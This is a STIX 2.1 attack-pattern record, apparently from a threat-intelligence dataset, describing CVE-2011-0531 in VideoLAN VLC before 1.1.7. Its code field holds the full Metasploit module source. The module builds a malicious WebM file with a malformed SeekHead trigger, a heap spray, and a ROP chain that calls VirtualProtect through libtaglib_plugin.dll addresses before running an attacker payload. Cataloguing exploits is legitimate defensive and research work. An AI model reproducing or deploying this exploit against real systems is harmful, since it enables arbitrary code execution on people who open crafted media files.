{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--57f2623f-e16b-43b4-a565-c713a4b079bf",
    "created": "2024-08-14T16:37:08.562438Z",
    "modified": "2024-08-14T16:37:08.562441Z",
    "name": "VideoLAN VLC MKV Memory Corruption",
    "description": " This module exploits an input validation error in VideoLAN VLC < 1.1.7.  By creating a malicious MKV or WebM file, a remote attacker could execute arbitrary code.  NOTE: As of July 1st, 2010, VLC now calls SetProcessDEPPoly to permanently enable NX support on machines that support it.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/vlc_webm.rb",
            "external_id": "vlc_webm.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-0531"
        },
        {
            "source_name": "reference",
            "url": "http://git.videolan.org/?p=vlc.git&a=commitdiff&h=59491dcedffbf97612d2c572943b56ee4289dd07&hp=f085cfc1c95b922e3c750ee93ec58c3f2d5f7456"
        },
        {
            "source_name": "reference",
            "url": "http://www.videolan.org/security/sa1102.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'VideoLAN VLC MKV Memory Corruption',\n      'Description'    => %q{\n          This module exploits an input validation error in VideoLAN VLC\n        < 1.1.7.  By creating a malicious MKV or WebM file, a remote attacker\n        could execute arbitrary code.\n\n        NOTE: As of July 1st, 2010, VLC now calls SetProcessDEPPoly to\n        permanently enable NX support on machines that support it.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'Dan Rosenberg' ],\n      'References'     =>\n        [\n          [ 'OSVDB', '70698' ],\n          [ 'CVE', '2011-0531' ],\n          [ 'BID', '46060' ],\n          [ 'URL', 'http://git.videolan.org/?p=vlc.git&a=commitdiff&h=59491dcedffbf97612d2c572943b56ee4289dd07&hp=f085cfc1c95b922e3c750ee93ec58c3f2d5f7456' ],\n          [ 'URL', 'http://www.videolan.org/security/sa1102.html' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'\t\t=> 1024,\n          'DisableNops'\t=> true,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'VLC 1.1.6 on Windows XP SP3',\n            {\n              'SprayTarget' => 0x030b030a,\n              'Ret' => 0x6ce091b5,\t\t# Pointer to SprayTarget\n              'Base' => 0x6cd00000,\t\t# Base of libtaglib_plugin.dll\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-01-31',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.webm']),\n      ])\n  end\n\n  def exploit\n\n    rop_base = target[\"Base\"]\n    spray = target[\"SprayTarget\"]\n\n    # EBML Header\n    file =  \"\\x1A\\x45\\xDF\\xA3\"\t# EBML\n    file << \"\\x01\\x00\\x00\\x00\"\n    file << \"\\x00\\x00\\x00\\x1F\"\n    file << \"\\x42\\x86\\x81\\x01\"\t# EBMLVersion = 1\n    file << \"\\x42\\xF7\\x81\\x01\"\t# EBMLReadVersion = 1\n    file << \"\\x42\\xF2\\x81\\x04\"\t# EBMLMaxIDLength = 4\n    file << \"\\x42\\xF3\\x81\\x08\"\t# EBMLMaxSizeLength = 8\n    file << \"\\x42\\x82\\x84\\x77\"\t# DocType = \"webm\"\n    file << \"\\x65\\x62\\x6D\"\n    file << \"\\x42\\x87\\x81\\x02\"\t# DocTypeVersion = 2\n    file << \"\\x42\\x85\\x81\\x02\"\t# DocTypeReadVersion = 2\n\n    # Segment data\n    file << \"\\x18\\x53\\x80\\x67\"\t# (0) Segment\n    file << \"\\x01\\x00\\x00\\x00\"\n    file << \"\\x01\\xD6\\x22\\xF1\"\n\n    # Seek data\n    file << \"\\x11\\x4D\\x9B\\x74\"\t# (1) SeekHead\n    file << \"\\x40\\x3F\"\n\n    file << \"\\x4D\\xBB\\x8B\"\t\t# (2) Seek\n    file << \"\\x53\\xAB\\x84\"\t\t# (3) SeekID = Segment Info\n    file << \"\\x15\\x49\\xA9\\x66\"\t#\n\n    file << \"\\x53\\xAC\\x81\"\t\t# (3) SeekPosition\n    file << \"\\xff\"\t\t\t# \tindex of segment info\n\n    # Trigger the bug with an out-of-order element\n    file << \"\\x53\\xAB\\x84\"\t\t# (3) SeekID = Tracks\n    file << \"\\x16\\x54\\xAE\\x6B\"\t#\n\n    file << \"\\x42\" * 228 \t\t# Padding\n\n    # Data\n    file << \"\\x15\\x49\\xA9\\x66\"\t# (1) Segment Info\n    file << \"\\x01\\x00\\x00\\x00\"\t#\n    file << \"\\x01\\xff\\xff\\xff\"\t# This triggers our heap spray...\n    file << [target.ret].pack('V')\t# Pointer to our heap spray\n\n    # The alignment plays nice, so EIP will always\n    # hit our pivot when our heapspray works.  ESI contains\n    # 0x030b030a, which will point to one of our \"pop; retn\"\n    # pointers, so this works as both a pivot and NOPsled\n    block = [\n      rop_base + 0x229a5,\t\t# xcgh esi,esp; retn\n      rop_base + 0x2c283,\t\t# pop eax; retn\n      0xdeadbeef,\t\t\t# pad\n      rop_base + 0x2c283,\t\t# pop eax; retn\n    ]\n    block = block.pack('V*')\n\n    # ROP payload\n    rop = [\n      rop_base + 0x1022,\t\t# retn\n\n      # Call VirtualProtect()\n      rop_base + 0x2c283,\t\t# pop eax; retn\n      rop_base + 0x1212a4,\t\t# IAT entry for VirtualProtect -> eax\n      rop_base + 0x12fda,\t\t# mov eax,DWORD PTR [eax]\n      rop_base + 0x29d13,\t\t# jmp eax\n\n      rop_base + 0x1022,\t\t# retn\n      spray & ~0xfff,\t\t\t# lpAddress\n      0x60000,\t\t\t# dwSize\n      0x40,\t\t\t\t# flNewProtect\n      spray - 0x1000,\t\t\t# lpfOldProtect\n\n      # Enough of this ROP business...\n      rop_base + 0xdace8              # push esp; retn\n    ]\n    rop = rop.pack('V*')\n\n    # Overwrite the bad pointer with the address of an infinite\n    # loop so the other threads spin instead of crashing\n    rop << \"\\xc7\\x05\"\n    rop << [spray + 0xc].pack('V')\n    rop << [rop_base + 0x1c070].pack('V')\t# mov DWORD PTR ds:[ptr],&loop\n\n    # Restore the stack\n    rop << \"\\x87\\xe6\"\t\t\t# xchg esi,esp\n\n    # Payload\n    rop << payload.encoded\n\n    # We need to be 16-byte aligned\n    rop << \"\\xcc\" * (16 - rop.length % 16)\n\n    # Heapspray and payload, go!\n    32.times {\n      0x3000.times {\n        file << block\n      }\n      file << rop\n    }\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    file_create(file)\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-01-31",
    "x_mitre_platforms": [
        "win'"
    ]
}